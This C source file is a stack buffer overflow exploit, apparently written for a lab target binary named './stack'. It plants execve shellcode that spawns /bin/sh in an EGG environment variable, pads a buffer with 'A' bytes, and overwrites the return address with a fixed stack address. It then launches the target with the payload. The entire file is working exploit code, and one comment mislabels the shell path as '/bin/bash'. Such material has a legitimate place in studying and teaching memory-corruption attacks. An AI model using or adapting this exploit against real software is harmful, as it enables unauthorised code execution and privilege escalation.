#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
#include <string.h>

#define BUFSIZE 0x20
#define EGGLOC 0x7fffffffefd3
int main(int argc, char* argv[]) {
  // neat shellcode
  char shellcode[] = 
    "EGG="
    "\xeb\x0e"      // jump +0xe (+14)
    "\x5f"          // pop %rdi
    "\x48\x31\xc0"  // xor %rax, %rax
    "\xb0\x3b"      // mov $0x3b, %al
    "\x48\x31\xf6"  // xor %rsi, %rsi
    "\x48\x31\xd2"  // xor %rdx, %rdx
    "\x0f\x05"      // syscall
    "\xe8\xed\xff\xff\xff\x2f"  // call 0xed (-19)
    "\x62\x69\x6e\x2f\x73\x68\x00\x5d"; // /bin/bash+\0

  // buffer used for overflow
  char buf[256];
  
  // fill buffer + ebp with 0x41's
  for (int i = 0; i <BUFSIZE+sizeof(void*); buf[i++] = 'A');

  // overwrite RIP with eggloc
  char **buff = (char**)(&buf[BUFSIZE+sizeof(void*)]);
  *(buff++) = (void*)EGGLOC;
  *buff = (void*)0x0;

  // setup execution environment and fire exploit
  char *args[3] = { "./stack", buf, NULL };
  char *envp[2] = { shellcode, NULL};
  execve("./stack", args, envp);
  return 0;
} 
